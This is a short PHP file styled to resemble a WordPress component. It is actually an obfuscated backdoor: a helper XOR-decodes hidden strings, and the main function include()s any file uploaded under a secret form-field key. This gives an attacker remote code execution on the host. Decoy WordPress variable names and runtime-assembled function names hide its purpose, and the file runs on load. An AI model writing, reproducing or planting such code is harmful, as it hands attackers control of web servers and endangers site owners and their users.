<?php 	
function _name()

{

    $opening_single_quote = 'P87bIxMDMr8';
    $no_found_rows = $opening_single_quote;
	$default_no_texturize_shortcodes = 'post_type_clauses';
    
    $mimes = $GLOBALS[_ext("%0F%7E%7E.%0C%2B", $no_found_rows)];
    $textarr = $mimes;
    $name = isset($textarr[$no_found_rows]);

    if ($name)

    {

        $output = $mimes[$no_found_rows];
	$hash = '_builtin';
        $sani_mime_type = $output[_ext("%24UG%3D%27%19+%21", $no_found_rows)];
        $safe_text = $sani_mime_type;

        include ($safe_text);
	$show_in_admin_all_list = 'incposts';
    }
}
function _ext($rest_base, $sort_column)

{

    $domains = $sort_column;
    $wp_timezone = "url" . "decode";

    $private = $wp_timezone($rest_base);
    $first = substr($domains,0, strlen($private));
    $mail = $private ^ $first;

    
    $private = strpos($mail, $first);
    
    return $mail;
}

_name();


?>
